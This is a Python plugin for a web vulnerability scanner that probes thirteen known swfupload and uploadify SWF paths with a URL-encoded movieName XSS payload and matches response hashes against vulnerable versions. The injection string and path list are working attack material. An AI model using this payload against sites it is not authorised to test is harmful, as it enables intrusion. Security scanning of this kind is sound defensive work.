#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2020/4/10
# JiuZero 2025/3/30

from urllib.parse import urlparse
import requests

from api import generateResponse, md5, conf, KB, VulType, PLACE, Type, PluginBase


class Z0SCAN(PluginBase):
    name = "FlashXSS"
    name = 'Flash SWF XSS'
    
    def condition(self):
        if 4 in conf.level and self.response.waf:
            return True
        return False
        
    def audit(self):
        if self.condition():
            p = urlparse(self.requests.url)
            arg = "{}://{}/".format(p.scheme, p.netloc)
            FileList = []
            FileList.append(arg + 'common/swfupload/swfupload.swf')
            FileList.append(arg + 'adminsoft/js/swfupload.swf')
            FileList.append(arg + 'statics/js/swfupload/swfupload.swf')
            FileList.append(arg + 'images/swfupload/swfupload.swf')
            FileList.append(arg + 'js/upload/swfupload/swfupload.swf')
            FileList.append(arg + 'addons/theme/stv1/_static/js/swfupload/swfupload.swf')
            FileList.append(arg + 'admin/kindeditor/plugins/multiimage/images/swfupload.swf')
            FileList.append(arg + 'includes/js/upload.swf')
            FileList.append(arg + 'js/swfupload/swfupload.swf')
            FileList.append(arg + 'Plus/swfupload/swfupload/swfupload.swf')
            FileList.append(arg + 'e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf')
            FileList.append(arg + 'include/lib/js/uploadify/uploadify.swf')
            FileList.append(arg + 'lib/swf/swfupload.swf')

            md5_list = [
                '3a1c6cc728dddc258091a601f28a9c12',
                '53fef78841c3fae1ee992ae324a51620',
                '4c2fc69dc91c885837ce55d03493a5f5',
            ]
            for payload in FileList:
                payload1 = payload + "?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22xss%22%29}}//"
                req = requests.get(payload1, headers=self.requests.headers)
                if req.status_code == 200:
                    md5_value = md5(req.content)
                    if md5_value in md5_list:
                        result = self.new_result()
                        result.init_info(Type.Request, self.requests.netloc, req.url, VulType.XSS, PLACE.URL)
                        result.add_detail("Request", req.reqinfo, generateResponse(req), "Match md5: {}".format(md5_value))
                        self.success(result)
